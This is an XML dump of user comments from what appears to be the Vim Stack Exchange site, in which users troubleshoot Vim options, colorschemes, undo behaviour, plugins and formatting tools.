  <row Id="10203" PostId="6453" Score="0" Text="I appreciated the Esc :). I tried it initially in normal mode. There must be something wrong with my vim installation. I think Rod Howard was having the [same issue](http://stackoverflow.com/questions/17561706/vim-yank-does-not-seem-to-work), I'll re-install as he suggests. System clipboard integration hasn't been working anyway and I need +python3 so it was on my todo. `g Ctrl-a` was what I needed, thanks again :)" CreationDate="2016-02-12T17:06:27.030" UserId="6402" />
  <row Id="10204" PostId="6453" Score="0" Text="You're welcome and good luck with fixing it :)" CreationDate="2016-02-12T17:07:00.463" UserId="1800" />
  <row Id="10205" PostId="6453" Score="1" Text="Fixed :D https://asciinema.org/a/2zqavz00sbzvumxwg742h3ozi" CreationDate="2016-02-12T17:26:47.213" UserId="6402" />
  <row Id="10206" PostId="6451" Score="1" Text="What are you trying to do? [(XY Problem)](http://meta.stackexchange.com/a/66378/188334)" CreationDate="2016-02-12T17:37:51.217" UserId="1405" />
  <row Id="10207" PostId="6454" Score="0" Text="Nice one :) 25?" CreationDate="2016-02-12T17:53:17.117" UserId="1800" />
  <row Id="10208" PostId="6454" Score="1" Text="@VanLaser: 1 (starting line) + 1 (recording the macro) + 24 = 26." CreationDate="2016-02-12T17:56:19.943" UserId="778" />
  <row Id="10209" PostId="6446" Score="0" Text="The second error is: `ImportError: No module named requests`. This can be fixed by installing `python-requests`." CreationDate="2016-02-12T18:39:03.950" UserId="51" />
  <row Id="10210" PostId="6451" Score="1" Text="@Circonflexe The problem comes from the function `changenr()` which sometimes returns a value that you (and I) don't understand. Most of the time, it returns what you (and I) expect, but sometimes (when you go back to the root), instead of returning the change number of the current leaf, it returns the change number of the deepest leaf in the nearest &quot;inactive branch&quot;." CreationDate="2016-02-12T19:05:04.707" UserId="4939" />
  <row Id="10211" PostId="6451" Score="1" Text="@Circonflexe Because of this, sometimes your `save` variable contains a value which is too high, therefore your `exe &quot;undo &quot; . save` doesn't bring you back to the expected leaf and your text `this must be undone` is not removed." CreationDate="2016-02-12T19:13:05.003" UserId="4939" />
  <row Id="10213" PostId="6453" Score="1" Text="What version of `vim` will increment `A` to `B` with the `Ctrl-a` action? Mine definitely does not, and I'm on `7.4 1-1202`." CreationDate="2016-02-12T23:37:34.353" UserId="1554" />
  <row Id="10214" PostId="6354" Score="0" Text="&quot;Chunky undo&quot; - best description I've seen." CreationDate="2016-02-12T23:42:55.147" UserId="6297" />
  <row Id="10215" PostId="6445" Score="0" Text="Yeah, this was about as unintrusive as I could get it, while still allowing me to type in tables/specially formatted text as I like. I figured if you have to leave insert mode anyways, might as well hook a mapping onto leaving insert mode." CreationDate="2016-02-13T01:02:11.193" UserId="4932" />
  <row Id="10217" PostId="6446" Score="0" Text="You can use `apt-get`, or `pip`. &quot;There is error&quot; is still not something anyone can provide any meaningful answer to." CreationDate="2016-02-13T03:39:10.983" UserId="51" />
  <row Id="10220" PostId="6459" Score="4" Text="The meaning of &quot;section&quot; is explained 3 paragraphs below your quote." CreationDate="2016-02-13T08:59:12.337" UserId="54" />
  <row Id="10222" PostId="6453" Score="4" Text="@CoryKlein Try typing `:set nrformats+=alpha`. It will add the value `alpha` to the option `'nrformats'` and should allow `Ctrl-a` to &quot;increment&quot; alphabetical characters. If you like this behavior, you could add it to your vimrc. Otherwise, you could add it to the option with the operator `+=` and remove it afterwards with the operator `-=` (`:set nrformats-=alpha`)." CreationDate="2016-02-13T09:27:54.307" UserId="4939" />
  <row Id="10223" PostId="6446" Score="0" Text="`apt` says that the `python-requests` is the newest version. and I figure out the problem. `python3` can import `requests` with no problem, but in `python2` (or `python`), there is an `ImportError`. I also use `pip`, it says that the package is up to date." CreationDate="2016-02-13T09:39:19.343" UserId="6380" />
  <row Id="10224" PostId="6463" Score="6" Text="If you get used to staying in normal mode, you won't have such problems ... and the Vim &quot;way&quot; *is* normal mode." CreationDate="2016-02-13T11:48:09.163" UserId="1800" />
  <row Id="10225" PostId="6463" Score="0" Text="@VanLaser yep, probably you're right. Will try to see if I can switch to normal mode every time I switch tab/window..." CreationDate="2016-02-13T12:00:34.567" UserId="854" />
  <row Id="10226" PostId="6463" Score="2" Text="If you switch windows using Vim's maps that start with `Ctrl-w`, you have to be in normal mode anyway ..." CreationDate="2016-02-13T12:07:14.880" UserId="1800" />
  <row Id="10227" PostId="6463" Score="1" Text="How do you switch windows in the first place? With the mouse? I don't really understand how you get this problem in the first place..." CreationDate="2016-02-13T12:48:01.670" UserId="21" />
  <row Id="10228" PostId="6463" Score="1" Text="@KarlYngveLervåg yes, I admit with shame --- with the mouse..." CreationDate="2016-02-13T14:15:56.507" UserId="854" />
  <row Id="10230" PostId="6464" Score="0" Text="How do you *use* it? You wash the car? :D" CreationDate="2016-02-13T17:06:34.387" UserId="1800" />
  <row Id="10231" PostId="6464" Score="0" Text="@VanLaser, if you are asking what plugins I loaded, I tried commenting out all. It is plug-vim itself that causes the problem." CreationDate="2016-02-13T17:09:02.147" UserId="4505" />
  <row Id="10232" PostId="6464" Score="1" Text="Try to put those lines in (possibly new) `~/.vim/after/syntax/tex.vim`" CreationDate="2016-02-13T17:11:46.317" UserId="1800" />
  <row Id="10233" PostId="6464" Score="0" Text="@VanLaser, already tried that, it didn't work." CreationDate="2016-02-13T17:15:40.510" UserId="4505" />
  <row Id="10234" PostId="6464" Score="0" Text="Create an issue on `vim-plug` github page, and make sure you include a minimal vimrc that exhibits the problem." CreationDate="2016-02-13T17:18:57.603" UserId="1800" />
  <row Id="10235" PostId="6465" Score="0" Text="How are you sourcing it in `.vimrc`? What is the output of `:scriptnames` before you manually load it?" CreationDate="2016-02-13T20:40:53.927" UserId="205" />
  <row Id="10236" PostId="6465" Score="0" Text="I've edited that in at the top.  As indicated, *nothing* in vimrc was edited when I did this.  The output of `scriptnames` includes it in order with other sourced scripts and does not change before or after sourcing it manually." CreationDate="2016-02-13T20:49:26.447" UserId="4913" />
  <row Id="10237" PostId="6466" Score="0" Text="If you would care to explain how this is supposed to be an answer to the question I will reverse my downvote." CreationDate="2016-02-13T21:55:39.730" UserId="4913" />
  <row Id="10238" PostId="6466" Score="2" Text="Everything you are doing is wrong and can't work. My answer shows you how to do it right." CreationDate="2016-02-13T22:12:41.217" UserId="54" />
  <row Id="10239" PostId="6466" Score="0" Text="Your answer **EXPLAINS NOTHING**.   I am not interested in this: https://en.wikipedia.org/wiki/Cargo_cult_programming &quot;Cut n' paste and trust me&quot; approach.  However, after a little experimentation I did garner something from this which did solve the problem, so if you would care to **explain** that (since I think you know what it is), then I'll accept the answer too.  If not, I'll add my own *explanation* in an answer and leave it at that.  (BTW, &quot;can't work&quot; obviously isn't true, because I've used it this way for *years*, but that is not the issue)" CreationDate="2016-02-13T22:16:24.600" UserId="4913" />
  <row Id="10240" PostId="6467" Score="1" Text="No reason to downvote. It's a completely reasonable answer. I'll try...." CreationDate="2016-02-13T22:49:18.103" UserId="854" />
  <row Id="10241" PostId="6465" Score="3" Text="`:help hi-normal-cterm` recommends setting the colors for Normal first, before setting any other colors. My first suggestion is to move the `hi Normal ...` line to the top of the `hi` list. Next, I would set your colorscheme from your `~/.vimrc` by executing `colorscheme colorscheme` rather than by sourcing the file so as to pick up any other steps Vim thinks is necessary when setting a colorscheme. Not that other approaches won't work, but if you're having trouble, the closer your attempt is to the &quot;standard&quot; solution, the better chance you will have finding someone who can spot the problem." CreationDate="2016-02-13T23:24:33.330" UserId="2055" />
  <row Id="10242" PostId="6465" Score="1" Text="@garyjohn When I added those new lines I alphabetized everything -- something I had forgotten but your *explanation* reminded me.  However, moving &quot;Normal&quot; to the top didn't fix anything.  What did is sourcing it via `colorscheme` (regardless of where `Normal` is).  I fear my use of the term &quot;color scheme&quot; in the title and the fact that I called the sourced file `colorscheme.vim` may have caused some confusion -- the actual command is something I had never heard of.  My .vimrc goes back more than a decade and I've just occasionally moved parts of it out to other files for sourcing." CreationDate="2016-02-13T23:38:00.613" UserId="4913" />
  <row Id="10243" PostId="6463" Score="0" Text="@Rmano I haven't fully tested the code, so there may be cases where it doesn't work as expected but you could temporarily try adding the following in your vimrc: http://vpaste.net/0PFdV" CreationDate="2016-02-14T04:57:22.303" UserId="4939" />
  <row Id="10244" PostId="6468" Score="1" Text="If you have a line containing the single word `foobar` and you hit on the `$` key, does your cursor land on the `r` character ? (meaning if you hit `x` you get `fooba`) If you want your cursor to move past the last character on the line, you could try the following command: `:set virtualedit+=onemore`" CreationDate="2016-02-14T05:57:12.123" UserId="4939" />
  <row Id="10245" PostId="6468" Score="0" Text="@saginaw Yeh if I hit x I do get fooba. But if I hit the $ key nothing happens" CreationDate="2016-02-14T06:01:05.130" UserId="6414" />
  <row Id="10246" PostId="6468" Score="0" Text="@saginaw Thanks that solved it. Would you mind explaining what that did and why that was not the default setting?" CreationDate="2016-02-14T06:02:25.593" UserId="6414" />
  <row Id="10247" PostId="6468" Score="2" Text="Vim's cursor is always _on_ a character position, never _between_ character positions, even though some cursor shapes make it appear that the cursor is between character positions. When your cursor appears to be before the last character, it is probably _on_ the last character. That is Vim's normal behavior. You can change it, if you like, by following saginaw's suggestion." CreationDate="2016-02-14T06:03:06.287" UserId="2055" />
  <row Id="10248" PostId="6468" Score="0" Text="@garyjohn I see, the cursor is displayed differently in the Cygwin Vim than in the raw Linux Vim. Thanks." CreationDate="2016-02-14T06:07:35.890" UserId="6414" />
  <row Id="10249" PostId="6468" Score="0" Text="@Joel The `$` key should move your cursor on the last character on the line, which in the case of `foobar` is `r`. So after hitting `$`, on my machine, I have a white blinking cursor on the `r` character, which means that the next operator (`x` for example) will affect `r`. If you have the same behavior on your machine, I think it's the default and normal one. If something different happens, I'm sorry but I don't know why." CreationDate="2016-02-14T06:08:26.623" UserId="4939" />
  <row Id="10250" PostId="6468" Score="0" Text="@Joel For the last command I mentioned, I found it after searching on the web. Here's the link from which I copied it: http://vim.1045645.n5.nabble.com/Why-doesn-t-the-cursor-go-beyond-the-last-character-in-Vim-when-in-command-mode-td3399472.html" CreationDate="2016-02-14T06:08:45.017" UserId="4939" />
  <row Id="10251" PostId="6468" Score="1" Text="@saginaw Since I am using Vim on Cygwin, my cursor is in between the characters, rather than on a character for some reason. Therefore it ends up before the last character rather than on it. Your fixed solved the problem though. Thanks." CreationDate="2016-02-14T06:11:38.557" UserId="6414" />
  <row Id="10254" PostId="6466" Score="1" Text="Everything is explained in various places of Vim's doc, which you are supposed to read; I'd suggest `:help :syn-default-override`. Your &quot;colorscheme&quot; is not a proper colorscheme so I show you how to make it one. That's a solution to your problem #1. You put it in the wrong place and I show you where to put it, that's the solution to your problem #2. You don't call it the right way and i show you how to call it correctly, that's a solution to your problem #3. But I'd say your problem #0 is simply not reading the manual and following your intuition anyway. For this I have no solution." CreationDate="2016-02-14T09:57:56.803" UserId="54" />
  <row Id="10255" PostId="6466" Score="0" Text="Now, if you have further questions on how colorschemes work, I would be happy to answer them as I happen to be a colorscheme author." CreationDate="2016-02-14T10:00:32.023" UserId="54" />
  <row Id="10256" PostId="6463" Score="0" Text="@saginaw seems to work --- why don't you put it as an answer?" CreationDate="2016-02-14T10:18:25.280" UserId="854" />
  <row Id="10257" PostId="6463" Score="0" Text="@Rmano Sorry, I was not sure it was exactly what you wanted and if it worked all the time." CreationDate="2016-02-14T10:33:57.290" UserId="4939" />
  <row Id="10258" PostId="6466" Score="0" Text="I'm guessing that's why your &quot;answer&quot; reads like, &quot;This is how *I* would write a colorscheme.&quot;  **It just looks like someone whats to show off how cool their config is or something.**  So I'm sorry to have been rude but: *I don't care how you would write a colorscheme*.  As per comments on the question, I wasn't even aware of the `colorscheme` command when I wrote the question (notice it is two words in the title, perhaps this led to some confusion).  RTFM (&quot;everything is explained in various places...&quot; just not here) is fine, but it is not an answer, it is a comment." CreationDate="2016-02-14T11:15:56.513" UserId="4913" />
  <row Id="10259" PostId="6466" Score="0" Text="And I guess we all have our style of pedentry, but this &quot;style&quot; still rates a -1 from me.  We'll have to agree to disagree about how knowledge is efficiently and effectively communicated." CreationDate="2016-02-14T11:16:02.810" UserId="4913" />
  <row Id="10260" PostId="6466" Score="2" Text="@romainl can you list a few of the missing things required for a colourscheme? Say, 5 of them? That would go a long way in improving this answer." CreationDate="2016-02-14T11:18:08.490" UserId="205" />
  <row Id="10261" PostId="6466" Score="0" Text="@muru, no, my answer doesn't need improvement." CreationDate="2016-02-14T11:54:02.113" UserId="54" />
  <row Id="10262" PostId="6466" Score="0" Text="@delicateLatticeworkFever, this is not &quot;how I would write a colorscheme&quot;, this is &quot;how colorschemes are written&quot;. If you want to write a colorscheme, follow the guidelines laid out in the documentation and you will be fine. It's as simple as that." CreationDate="2016-02-14T11:58:43.700" UserId="54" />
  <row Id="10263" PostId="6472" Score="4" Text="Found this, not tried: `set formatprg=par\ 72q\ g1  &quot; Use par for gq. use gw for internal formatting; g1 preserves double spaces after periods.` Source: http://www.8t8.us/configs/vimrc.txt" CreationDate="2016-02-14T12:10:08.797" UserId="1800" />
  <row Id="10264" PostId="6472" Score="0" Text="Nice find!  it works." CreationDate="2016-02-14T12:27:11.177" UserId="4505" />
  <row Id="10265" PostId="6450" Score="0" Text="Thank you very much for your response &amp; sorry for late acceptance, I was away from my PC for couple days ^^" CreationDate="2016-02-14T13:02:58.453" UserId="3302" />
  <row Id="10266" PostId="6450" Score="0" Text="@whitesiroi No problem. I had a clarification to ask: What does your general `/vagrant/my_project/app/Console/cake` usage look like? Does it change with the current file, etc.? We could come up with a more general command." CreationDate="2016-02-14T13:04:10.183" UserId="205" />
  <row Id="10267" PostId="6477" Score="3" Text="I think you try too hard to make Vim a WYSIWYG TeX (probably) Processor :) The only way I see your problem solved would be to use `formatexpr` instead of `formatprg`, and by using some Vim functions (`synconcealed()` ?) that allow you to somehow get access to the displayed text and pass it to the `formatexpr` in order to be formated by its looks, instead of its true contents. But I'm no guru, who knows what other tricks Vim hides?" CreationDate="2016-02-14T15:17:28.460" UserId="1800" />
  <row Id="10268" PostId="6477" Score="0" Text="@VanLaser, yes I think my solution for now will be to stop trying to use the conceal feature." CreationDate="2016-02-14T15:22:07.247" UserId="4505" />
  <row Id="10269" PostId="6477" Score="0" Text="Not sure if feasible, but you could try to make &amp; use  conceal rules that maintain the length of the concealed text, e.g. `&lt;space&gt;&lt;space&gt;&lt;greek alpha char&gt;&lt;space&gt;&lt;space&gt;` instead of `alpha`" CreationDate="2016-02-14T15:29:14.143" UserId="1800" />
  <row Id="10270" PostId="6477" Score="2" Text="I'm mildly curious as to why you would care so much about paragraph formatting that ultimately will have no effect on the output. In (La)TeX I just let it hard wrap at X columns and leave it be. (I'm just assuming TeX going by your previous question.)" CreationDate="2016-02-14T16:53:48.133" UserId="205" />
  <row Id="10271" PostId="6477" Score="0" Text="@muru, ragged margins make me dizzy." CreationDate="2016-02-14T16:57:47.500" UserId="4505" />
  <row Id="10272" PostId="6478" Score="2" Text="Start with `:h toolbar-icon` and `:h guifont`" CreationDate="2016-02-14T17:20:52.880" UserId="1800" />
  <row Id="10273" PostId="6478" Score="4" Text="... and combine with http://vim.wikia.com/wiki/Change_font_size_quickly (I'm lazy, ... I don't need it :D )" CreationDate="2016-02-14T17:41:27.373" UserId="1800" />
  <row Id="10274" PostId="3542" Score="0" Text="If both are on the same line, you could just type `f$`, and then `;` and `,` to jump between them." CreationDate="2016-02-15T07:42:24.273" UserId="4676" />
  <row Id="10275" PostId="3526" Score="0" Text="Mnemonic: `Ctrl-g` to find out what is **G**oing on." CreationDate="2016-02-15T08:30:17.907" UserId="4676" />
  <row Id="10276" PostId="6478" Score="0" Text="Thanks! I tried, at least with the vim.wikia link. The defined commands seem to be ignored in my gvim, so I am still working on it." CreationDate="2016-02-15T09:25:05.860" UserId="5919" />
  <row Id="10277" PostId="6450" Score="0" Text="Thank you very much for your help. I did update my question, so please have a look at it if you have some time." CreationDate="2016-02-15T09:38:38.650" UserId="3302" />
  <row Id="10278" PostId="6479" Score="4" Text="You mean something other than a [`modeline`](http://vimdoc.sourceforge.net/htmldoc/options.html#modeline)?" CreationDate="2016-02-15T09:50:41.280" UserId="205" />
  <row Id="10279" PostId="6451" Score="1" Text="@mMontu: This is a MWE, strictly about `undo`. The full function would be a `:w` filter (make changes, save file, undo changes).&#xA;&#xA;@saginaw, also @mMontu's answer below: so far nothing new, I did write all those `echo` lines in my function,  (again **M**WE...)" CreationDate="2016-02-15T10:23:52.533" UserId="1940" />
  <row Id="10280" PostId="6478" Score="0" Text="I think the `pattern` definition has an extra space which will not work on Windows, or in OSes where `guifont` looks like `FontName:h12` instead of `FontName\ 12`. And of course try without the `has(&quot;gui_gtk2&quot;)` check  (at least for Windows)." CreationDate="2016-02-15T10:26:26.807" UserId="1800" />
  <row Id="10281" PostId="6448" Score="1" Text="You might be interested in the [`vim-rooter`](https://github.com/airblade/vim-rooter) plugin." CreationDate="2016-02-15T11:30:26.813" UserId="205" />
  <row Id="10285" PostId="6483" Score="1" Text="See my answer to a similar question here: http://vi.stackexchange.com/a/6043/4932  also check out this plugin: https://github.com/vim-scripts/Improved-paragraph-motion" CreationDate="2016-02-15T14:43:38.223" UserId="4932" />
  <row Id="10288" PostId="6483" Score="0" Text="@Lawrence DOS line endings? Are you on Linux using a Windows file?" CreationDate="2016-02-15T15:00:13.190" UserId="205" />
  <row Id="10289" PostId="6483" Score="1" Text="Plugin looks very interesting, but I got an error loading it: `Error detected while processing /Users/lawrence/.vim/plugged/Improved-paragraph-motion/plugin/ipmotion.vim:&#xA;line   50:&#xA;E492: Not an editor command: ^M&#xA;line   51:&#xA;E15: Invalid expression: exists('g:loaded_ipmotion')^M&#xA;line  145:&#xA;E171: Missing :endif`" CreationDate="2016-02-15T15:00:32.383" UserId="4505" />
  <row Id="10290" PostId="6483" Score="0" Text="@fruglemonkey, no, I'm using a Mac ..." CreationDate="2016-02-15T15:01:13.933" UserId="4505" />
  <row Id="10291" PostId="6483" Score="1" Text="@fruglemonkey, as far as I can understand the error was in the plugin. error messages went away after `:set ff=unix`." CreationDate="2016-02-15T16:12:58.783" UserId="4505" />
  <row Id="10292" PostId="6431" Score="0" Text="The g:netrw_scp_cmd should be set after you've opened a netrw buffer, or if you've set it in your .vimrc.  Another thing: try :help netrw-debug and get a trace of what's actually happening." CreationDate="2016-02-15T16:24:33.093" UserId="2377" />
  <row Id="10293" PostId="6483" Score="1" Text="The plugin affects only } and { motions, not text-objects." CreationDate="2016-02-15T16:26:17.310" UserId="4505" />
  <row Id="10294" PostId="6460" Score="0" Text="very cool ! (+1)" CreationDate="2016-02-15T18:29:53.593" UserId="3002" />
  <row Id="10296" PostId="6479" Score="2" Text="take a look at http://superuser.com/questions/641946/add-file-specific-good-words-to-internal-vim-wordlist-via-modeline" CreationDate="2016-02-15T18:40:43.400" UserId="3002" />
  <row Id="10297" PostId="6484" Score="1" Text="The answer should be obvious from Par's [manual](http://www.nicemice.net/par/par-doc.var)... provided that you're one of the three persons alive that actually understand said manual. :) Unrelated: don't put comments at end of lines in Vim files, especially to `set` lines." CreationDate="2016-02-15T18:46:00.067" UserId="2313" />
  <row Id="10300" PostId="6484" Score="0" Text="@SatoKatsura, are you saying that this posibility already lies in par? why not put comments there? had no problem with it so far." CreationDate="2016-02-15T19:20:26.120" UserId="4505" />
  <row Id="10301" PostId="6489" Score="0" Text="`:h spellcapcheck` ?" CreationDate="2016-02-15T19:51:34.270" UserId="1800" />
  <row Id="10302" PostId="6489" Score="0" Text="@VanLaser, that is only for caps at the beginning of sentences, as far as I can see." CreationDate="2016-02-15T20:15:14.410" UserId="4505" />
  <row Id="10303" PostId="6489" Score="0" Text="Did you try it? `set spellcapcheck=`" CreationDate="2016-02-15T20:19:17.513" UserId="1800" />
  <row Id="10304" PostId="6484" Score="2" Text="Re: comments at end of lines: `&quot;` is also a string delimiter, Vim's parser is not particularly robust, and the syntax of `set` is not exactly straightforward.  Sooner or later you'll get comments parsed as option values.  This is a well-known pitfall." CreationDate="2016-02-15T20:24:17.123" UserId="2313" />
  <row Id="10305" PostId="6489" Score="0" Text="@VanLaser, yes, I already have it my .vimrc." CreationDate="2016-02-15T20:25:37.437" UserId="4505" />
  <row Id="10306" PostId="6490" Score="1" Text="For a hint to the 1st issue, see end of `:h line()` (generic solution): &quot;		This autocommand jumps to the last known position in a file 		just after opening it, if the '&quot; mark is set: :au BufReadPost * if line(&quot;'\&quot;&quot;) &gt; 1 &amp;&amp; line(&quot;'\&quot;&quot;) &lt;= line(&quot;$&quot;) | exe &quot;normal! g`\&quot;&quot; | endif" CreationDate="2016-02-15T20:25:48.560" UserId="1800" />
  <row Id="10307" PostId="5315" Score="1" Text="@PhilippFrank, why not just use `0x&gt;&gt;0P`?  Then it will work for any one-character comment indicator (`#`, `&quot;`, etc.)" CreationDate="2016-02-15T20:27:02.817" UserId="4676" />
  <row Id="10308" PostId="5315" Score="0" Text="@Alexey, you could use a mapping to something like `^a&lt;Tab&gt;&lt;Esc&gt;` and depend on your `expandtab` and `tabwidth` settings to be sensible." CreationDate="2016-02-15T20:28:31.660" UserId="4676" />
  <row Id="10309" PostId="6489" Score="0" Text="The option is local to buffer. Just try this in a new buffer: `:set spell spelllang=de spellcapcheck=` and start testing." CreationDate="2016-02-15T20:33:04.917" UserId="1800" />
  <row Id="10310" PostId="6489" Score="0" Text="@VanLaser, tried it, but it doesn't work." CreationDate="2016-02-15T20:49:46.690" UserId="4505" />
  <row Id="10311" PostId="6488" Score="0" Text="You don't _need_ a plugin to use `ag` with Vim, but sometimes such a plugin can be quite handy.  [CtrlSF](https://github.com/dyng/ctrlsf.vim) is a good example.  FWIW." CreationDate="2016-02-15T21:07:54.083" UserId="2313" />
  <row Id="10312" PostId="6492" Score="1" Text="In Vim (or in terminal), `&lt;c-m&gt;` inserts Carriage Return /CR (Enter) (and `&lt;c-j&gt;`, a newline (NL) ). See `:h CTRL-M` and `:h i_CTRL-M`, or this answer: http://superuser.com/questions/433903/how-to-type-carriage-return" CreationDate="2016-02-15T21:54:22.287" UserId="1800" />
  <row Id="10313" PostId="6483" Score="1" Text="Yeah, but you can otherwise create mappings that will let it behave 'like' a text object. Why do you want a custom paragraph delimiter? What action do you want to perform that would require one?" CreationDate="2016-02-15T22:14:24.540" UserId="4932" />
  <row Id="10314" PostId="6483" Score="1" Text="@fruglemonkey, did it and it seems to work fine. sometimes I want to keep equations in the same paragraph as the surrounding text, but not format the source of the equation." CreationDate="2016-02-15T22:23:51.993" UserId="4505" />
  <row Id="10315" PostId="6490" Score="0" Text="Can't you use a jump list and/or cross-file marks?" CreationDate="2016-02-15T22:55:02.430" UserId="4932" />
  <row Id="10316" PostId="6490" Score="0" Text="Similar post: [In Vim how to switch quickly between .h and .cpp files with the same name?](http://stackoverflow.com/questions/17170902/in-vim-how-to-switch-quickly-between-h-and-cpp-files-with-the-same-name/17171698#17171698)" CreationDate="2016-02-16T01:15:49.337" UserId="778" />
  <row Id="10317" PostId="6488" Score="1" Text="I belive the `--vimgrep` option uses `--nogroup`, `--nocolor`, and `--column` by default." CreationDate="2016-02-16T01:19:31.910" UserId="778" />
  <row Id="10318" PostId="6485" Score="4" Text="Newer versions of vim 7.4.858+ provide a native version of `:Qfdo` via `:cdo`." CreationDate="2016-02-16T01:25:07.687" UserId="778" />
  <row Id="10320" PostId="6489" Score="0" Text="&quot;Wie viel kostet das Hündchen im Schaufenster?&quot; reports no errors to me with `set spell spelllang=de`, with default `spellcapcheck` (`spellcapcheck` is not for this). In fact, I get an error if I make the nouns lowercase. Could it be an old Vim?" CreationDate="2016-02-16T01:55:50.437" UserId="4729" />
  <row Id="10322" PostId="6448" Score="0" Text="@muru Thank you very much for your great help. Plugin does work greatly." CreationDate="2016-02-16T03:53:28.027" UserId="3302" />
  <row Id="10323" PostId="6490" Score="2" Text="perhaps you are looking for [A.vim](http://www.vim.org/scripts/script.php?script_id=31)" CreationDate="2016-02-16T07:44:06.240" UserId="71" />
  <row Id="10324" PostId="6497" Score="0" Text="+1 Thank you very much. It works perfectly." CreationDate="2016-02-16T08:01:28.090" UserId="3302" />
  <row Id="10325" PostId="6498" Score="0" Text="+1 Thank you very much. It does work perfectly. Sorry for not accepting you answer. Learn a lot. Again, thank you man." CreationDate="2016-02-16T08:03:18.573" UserId="3302" />
  <row Id="10326" PostId="6498" Score="2" Text="No problem, you can only mark one answer as accepted. Which answer you prefer is of course up to you. I just wanted to show a different way of solving the same problem, and I think both solutions are relatively equivalent." CreationDate="2016-02-16T08:07:14.663" UserId="21" />
  <row Id="10327" PostId="6501" Score="0" Text="If I just want to run one input file at a time, what should I do? If I just want to run input the content of `abc.in` in my java program?" CreationDate="2016-02-16T09:48:37.447" UserId="6433" />
  <row Id="10328" PostId="6499" Score="0" Text="According to contemp. rules, yes, not, for instance, in Grimm's dictionary." CreationDate="2016-02-16T09:49:50.803" UserId="4505" />
  <row Id="10329" PostId="6501" Score="2" Text="`:!java MyProgram abc.in` should be good, no?" CreationDate="2016-02-16T09:50:21.287" UserId="4729" />
  <row Id="10330" PostId="6499" Score="0" Text="Besides it should be possible to use lowercase privately. And when using a german word in English, kleinschreibung is arguably the most sensible, even if one cares about cont. rules." CreationDate="2016-02-16T09:56:30.167" UserId="4505" />
  <row Id="10331" PostId="6451" Score="1" Text="@Circonflexe I don't know how to do it, but you need to find a way to get the id of the current leaf / node, and `changenr()` is not a reliable way to get this info, because when you undo, it doesn't return the current id, it returns this: `After undo it is one less than the number of the undone change.` Maybe this link will help you a little: https://www.reddit.com/r/vim/comments/dszuz/gundo_my_little_undo_tree_visualization_plugin/c12ril4 What this person says is that you must look in the dictionary returned by `undotree()`." CreationDate="2016-02-16T10:12:36.693" UserId="4939" />
  <row Id="10332" PostId="6451" Score="0" Text="@Circonflexe If no node in the tree is marked with the key `curhead`, then it means you can use `changenr()` to get the id of the current node. But if there's one node which is marked with `curhead`, then your current node is its parent (not `changenr()`). So, unless someone else has a simpler way of doing it, the first step would be to find how to parse the undo tree, that is the dictionary returned by `undotree()` to find if a node is marked with `curhead`. The output of `undotree()` is quite complex, it seems to be a recursive imbrication of dictionaries and lists." CreationDate="2016-02-16T10:12:49.370" UserId="4939" />
  <row Id="10334" PostId="6451" Score="0" Text="@Circonflexe However, once you have found how to parse this (again I don't know how), then your problem should be quite easy to solve. You could look at how other people have solved the parsing problem, here for example: https://github.com/mbbill/undotree/blob/39e5cf0fc241c64e920f91d52299b444475d54df/plugin/undotree.vim#L783-L809" CreationDate="2016-02-16T10:25:29.720" UserId="4939" />
  <row Id="10335" PostId="4955" Score="0" Text="Ack or Ag will also work and you can find plugin wrappers for these command line tools pretty easily. E.g. https://github.com/mileszs/ack.vim and https://github.com/rking/ag.vim" CreationDate="2016-02-15T23:38:35.983" UserId="6430" />
  <row Id="10336" PostId="6506" Score="1" Text="Hm...`:echo split(fugitive#statusline(), '[()]')[1]` works perfectly, but when I place the last line you suggested `set statusline+=%{...` it returns error: `E684: list index out of range: 1`. What's wrong!?((" CreationDate="2016-02-16T10:42:38.867" UserId="5321" />
  <row Id="10337" PostId="6506" Score="2" Text="@TimurFayzrakhmanov are you running it in a window whose directory is not in Git? I get that error if I'm not in a git repository." CreationDate="2016-02-16T10:53:20.633" UserId="205" />
  <row Id="10338" PostId="6506" Score="0" Text="Right! And it always append &quot;0&quot; if a file isn't in git repo. Can you please suggest how to prevent this error (I mean place nothing if the file isn't in git repo)?" CreationDate="2016-02-16T10:57:10.007" UserId="5321" />
  <row Id="10339" PostId="6507" Score="4" Text="Separate questions, separate posts, please. What happens if you do `:silent! make | copen`?" CreationDate="2016-02-16T11:06:27.070" UserId="205" />
  <row Id="10340" PostId="6507" Score="1" Text="@muru +1 Again, thank you mate :) silent &amp; pipe does the trick. Only one question remain - how can I run it with FindRootDirectory()? I did create separate question http://vi.stackexchange.com/questions/6508/how-can-i-get-path-from-vim-rooters-function-and-run-it-with-quickruns-makeprg ^^" CreationDate="2016-02-16T11:09:24.767" UserId="3302" />
  <row Id="10341" PostId="6506" Score="0" Text="@TimurFayzrakhmanov see update." CreationDate="2016-02-16T11:11:45.387" UserId="205" />
  <row Id="10342" PostId="6506" Score="0" Text="Thank you! Works great!:)" CreationDate="2016-02-16T11:23:15.283" UserId="5321" />
  <row Id="10343" PostId="6451" Score="0" Text="@Circonflexe `The full function would be a :w filter (make changes, save file, undo changes)` -- this still seems as the Y problem in the XY problem. For instance, if your X problem is to write an adapted version of the current buffer to a different file, it could be easier to forget about the undo feature and just copy the current buffer to a new temporary buffer, where you filter and save the contents, them just discard the buffer instead of poluting and fighting the undo tree." CreationDate="2016-02-16T11:39:27.150" UserId="1405" />
  <row Id="10344" PostId="6449" Score="1" Text="Then how to get normal vim build for my old linux?" CreationDate="2016-02-16T11:48:26.447" UserId="6399" />
  <row Id="10345" PostId="6508" Score="1" Text="You seem to have a lot of problems with something called &quot;QuickRun&quot;. Whatever it is, don't you think you should read that thing's documentation and/or use its issue tracker?" CreationDate="2016-02-16T12:04:41.433" UserId="54" />
  <row Id="10346" PostId="6449" Score="1" Text="Similar to how you got the old version. Install it from your package manager or compile yourself." CreationDate="2016-02-16T13:23:56.990" UserId="71" />
  <row Id="10347" PostId="6511" Score="4" Text="Have you tried `:set modifiable`? Alternatively, `:redir` could help." CreationDate="2016-02-16T15:02:30.533" UserId="4932" />
  <row Id="10348" PostId="6494" Score="0" Text="Good point, when working in nvim, the search results appear in quickfix window.  This allows you to quickly scan through the window before going on with the replacement.  For example, if notice that the search is not ignoring files in `.git` directory, you may want to redo the search, or it will invalidate the SHA.  Thanks for the comment..." CreationDate="2016-02-16T15:26:08.073" UserId="3050" />
  <row Id="10349" PostId="6485" Score="1" Text="@PeterRincker, I use neovim, it has it, so thanks to your comment, my .nvimrc is now 60 lines less." CreationDate="2016-02-16T15:29:21.677" UserId="3050" />
